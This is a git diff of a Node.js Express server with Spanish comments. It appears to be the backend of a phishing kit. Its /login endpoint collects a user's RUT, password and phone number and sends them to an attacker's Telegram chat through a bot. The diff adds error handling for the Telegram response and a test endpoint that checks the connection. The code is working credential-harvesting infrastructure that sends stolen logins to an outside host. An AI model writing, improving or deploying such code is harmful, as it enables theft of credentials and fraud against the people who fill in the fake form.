@@ -4,7 +4,7 @@ const cors = require("cors");
 
 const app = express();
 
-// Habilitar CORS para permitir llamadas desde GitHub Pages
+// Habilitar CORS
 app.use(cors());
 
 // Middleware para parsear JSON
@@ -15,10 +15,10 @@ app.use(express.urlencoded({ extended: true }));
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
+// Endpoint de login
 app.post("/login", async (req, res) => {
   const { rut, passwd, telefono } = req.body;
 
-  // Validar que el teléfono sea obligatorio
   if (!telefono) {
     return res.status(400).send("❌ El campo 'teléfono' es obligatorio.");
   }
@@ -29,16 +29,46 @@ Contraseña: ${passwd}
 Teléfono: ${telefono}`;
 
   try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
     });
 
-    res.send("✅ Hemos recibido tu solicitud.");
+    const data = await response.json();
+    console.log("Telegram API response:", data);
+
+    if (data.ok) {
+      res.send("✅ Hemos recibido tu solicitud.");
+    } else {
+      res.status(500).send(`❌ Error: ${data.description}`);
+    }
   } catch (error) {
-    console.error(error);
+    console.error("Error enviando a Telegram:", error);
     res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente");
+  }
+});
+
+// Endpoint de prueba para Telegram
+app.get("/test-telegram", async (req, res) => {
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: "🚀 Prueba de conexión desde Render (login-ob-902p)" })
+    });
+
+    const data = await response.json();
+    console.log("Telegram API response:", data);
+
+    if (data.ok) {
+      res.send("✅ Mensaje de prueba enviado a Telegram.");
+    } else {
+      res.status(500).send(`❌ Error: ${data.description}`);
+    }
+  } catch (error) {
+    console.error("Error en test-telegram:", error);
+    res.status(500).send("❌ No se pudo enviar el mensaje de prueba.");
   }
 });
 
